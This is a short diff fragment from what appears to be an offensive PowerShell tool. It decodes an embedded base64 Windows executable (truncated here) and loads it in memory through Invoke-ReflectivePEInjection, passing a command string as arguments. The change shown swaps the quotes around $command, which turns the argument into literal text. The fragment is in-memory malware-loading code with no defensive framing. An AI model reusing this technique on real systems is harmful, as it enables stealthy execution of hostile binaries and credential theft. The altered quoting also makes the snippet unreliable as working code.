@@ -2917,6 +2917,6 @@ $PEBytes32 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
        [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
  }
  
-Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "$command"
+Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs '$command'
  
 }
